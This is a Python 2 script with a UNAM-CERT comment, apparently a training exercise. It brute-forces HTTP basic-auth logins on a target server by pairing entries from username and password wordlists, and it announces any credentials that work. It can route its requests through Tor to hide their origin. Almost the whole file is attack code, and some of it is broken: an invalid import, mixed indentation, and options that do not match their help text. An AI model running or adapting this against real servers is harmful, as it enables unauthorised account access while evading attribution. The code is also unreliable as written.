#!/usr/bin/python
# -*- coding: utf-8 -*-
#UNAM-CERT
import sys
import optparse
import socks
import socket
from requests import get
from requests.exceptions import ConnectionError
from urllib2 import urlopen
import urllib.requests

usuarios = []
contrasenas = []

def printError(msg, exit = False):
        sys.stderr.write('Error:\t%s\n' % msg)
        if exit:
            sys.exit(1)

def addOptions():
    parser = optparse.OptionParser()
    parser.add_option('-v','--verbose', dest='verbose', default=None, action='store_true', help='If specified, prints detailed information during execution.')
    parser.add_option('-p','--port', dest='port', default='80', help='Port that the HTTP server is listening to.')
    parser.add_option('-s','--server', dest='server', default=None, help='Host that will be attacked.')
    parser.add_option('-r','--report', dest='report', default=None, help='File where the results will be reported.')
    parser.add_option('-U', '--user', dest='user', default=None, help='User that will be tested during the attack.')
    parser.add_option('-P', '--password', dest='password', default=None, help='Password that will be tested during the attack.')
    parser.add_option('-T', '--tor', dest='tor', default=None, action="store_true", help='Make request with TOR')

    opts,args = parser.parse_args()
    return opts
    
def checkOptions(options):
    if options.server is None:
        printError('Debes especificar un servidor a atacar.', True)


def buildURL(server,port, protocol = 'https'):
    url = '%s://%s:%s' % (protocol,server,port)
    return url


def makeRequest(host, user, password):
    try:
	response = get(host, auth=(user,password))
	#print response
	#print dir(response)
	if response.status_code == 200:
	    print 'CREDENCIALES ENCONTRADAS!: %s\t%s' % (user,password)
                        
	else:
	    print 'NO FUNCIONO :c '
    except ConnectionError:
        printError('Error en la conexion, tal vez el servidor no esta arriba.',True)

def ataque(host, file_usuarios, file_pass):

    with open (file_usuarios) as inputfile:
         for line in inputfile.readlines():
             usuarios.append(line[:-1])
             
    with open (file_pass) as inputfile:
         for line in inputfile.readlines():
            contrasenas.append(line[:-1])
            
    for m in usuarios:
        for n in contrasenas:
            makeRequest(host, m, n)


def tor(options):
    if options.tor != None:
       socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
       socket.socket = socks.socksocket
    else:
       pass

def myip():
    my_ip = urlopen('http://ip.42.pl/raw').read()
    print 'La ip utilizada para el ataque es', my_ip



if __name__ == '__main__':
    try:
        opts = addOptions()
        checkOptions(opts)
        tor(opts)
        myip()
        url = buildURL(opts.server, port = opts.port)
#        opener = urllib2.build_opener()
#        opener.addheaders = [('User-Agent', 'Marco Disner')]
#        opener.open('http://%s'%(opts.server))
        ataque(url, opts.user, opts.password)
        makeRequest(url, opts.user, opts.password)
    except Exception as e:
        printError('Ocurrio un error inesperado')
        printError(e, True)
